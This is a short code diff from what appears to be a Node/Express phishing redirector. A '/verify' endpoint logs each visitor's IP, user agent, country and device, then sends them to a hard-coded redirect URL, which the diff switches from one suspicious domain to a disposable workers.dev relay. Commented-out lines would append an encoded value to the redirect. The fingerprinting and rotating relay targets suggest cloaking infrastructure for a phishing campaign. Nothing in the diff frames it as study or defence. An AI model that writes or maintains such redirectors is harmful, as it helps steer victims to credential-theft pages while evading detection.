@@ -214,7 +214,7 @@ app.post('/verify', async (req, res) => {
         const device = detectDeviceType(ua);
 
         logVisitor(clientIp, ua, country, device);
-        const baseUrl = process.env.REDIRECT_BASE_URL || 'https://pwd65ssh.com/share/GGtoA7JKiJU';
+        const baseUrl = process.env.REDIRECT_BASE_URL || 'https://net-relay-a0ad.605c468634a70695049ca9b1.workers.dev/share/SFGDrYEx6Pc';
         const cleanBaseUrl = baseUrl.endsWith('#') ? baseUrl.slice(0, -1) : baseUrl;
         //const redirectUrl = cleanBaseUrl + '/' + encodeURIComponent(cleanB64);
         //const redirectUrl = cleanBaseUrl + '/' + encodeURIComponent(cleanB64);
